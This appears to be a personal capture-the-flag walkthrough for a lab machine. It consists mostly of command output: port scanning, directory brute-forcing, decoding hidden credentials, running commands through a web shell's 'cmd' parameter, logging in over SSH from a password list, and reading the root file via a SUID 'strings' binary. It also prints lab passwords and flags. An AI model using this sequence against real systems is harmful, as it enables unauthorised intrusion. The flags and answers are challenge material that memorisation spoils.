**Tristan Gomez**

```
└─$ sudo nmap -sS 10.10.8.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-30 12:08 PDT
Nmap scan report for 10.10.8.110
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds

```

//they switch ports on me. 22 is http and 80 is ssh!
`http://10.10.8.110:22/`

```
└─$ gobuster dir -x .php -w directory-list-2.3-small.txt -u http://10.10.8.110:22/                              
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.8.110:22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/08/30 12:13:25 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 314] [--> http://10.10.8.110:22/assets/]
/recovery.php         (Status: 200) [Size: 943] 
```

```
Note to self - If I ever get locked out I can get back in at /recovery.php! 
  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
                    
Remember to wish Johny Graves well with his crypto jobhunting! 
His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

// recovery.php
```
 GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  
```

```
Remember that the credentials to the recovery login are hidden on the homepage! 
I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

```
└─$ cat cms*
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY

```

// http://10.10.8.110:22/nnxhweOV/index.php

`GET me a 'cmd' and I'll run it for you Future-Jack. `

// http://10.10.8.110:22/nnxhweOV/index.php?cmd=ls
`GET me a 'cmd' and I'll run it for you Future-Jack. index.php index.php`
                                                 
```
total 16 
drwxr-xr-x 3 root root 4096 Feb 29 2020 . 
drwxr-xr-x 23 root root 4096 Feb 29 2020 .. 
drwxr-x--- 3 jack jack 4096 Feb 29 2020 jack 
-rw-r--r-- 1 root root 408 Feb 29 2020 jacks_password_list
-rw-r--r-- 1 root root 408 Feb 29 2020 jacks_password_list
```

`http://10.10.8.110:22/nnxhweOV/index.php?cmd=cat%20/home/jacks_password_list`
```
GET me a 'cmd' and I'll run it for you Future-Jack.
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
ow5APF>6r,y4krSo
```
`[80][ssh] host: 10.10.8.110   login: jack   password: ITMJpGGIqg1jn?>@
`

/user.jpg
`securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`

```
jack@jack-of-all-trades:~$ find /  -perm /4000
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
find: `/sys/kernel/debug': Permission denied
find: `/var/lib/container': Permission denied
find: `/var/lib/php5/sessions': Permission denied
find: `/var/lib/sudo/lectured': Permission denied
find: `/var/log/apache2': Permission denied
find: `/var/log/exim4': Permission denied
find: `/var/cache/ldconfig': Permission denied
find: `/var/spool/cron/crontabs': Permission denied
find: `/var/spool/cron/atspool': Permission denied
find: `/var/spool/cron/atjobs': Permission denied
find: `/var/spool/rsyslog': Permission denied
find: `/var/spool/exim4': Permission denied
find: `/root': Permission denied
/bin/mount
/bin/umount
/bin/su

```

```
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}

```
